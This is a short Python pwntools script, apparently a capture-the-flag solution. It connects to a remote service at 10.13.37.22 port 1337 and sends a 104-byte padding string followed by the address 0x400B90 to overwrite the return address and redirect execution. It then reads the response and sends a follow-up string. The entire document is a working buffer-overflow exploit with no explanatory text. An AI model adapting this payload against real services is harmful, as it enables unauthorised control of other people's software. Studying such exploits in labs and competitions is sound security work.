from pwn import *
from time import sleep

gift = 0x400B90

r = remote('10.13.37.22', 1337)

r.send('A'*104 + p64(gift))
sleep(0.1)
print repr(r.recv())
sleep(2)
r.send('stoop')
sleep(1)
print repr(r.recv())
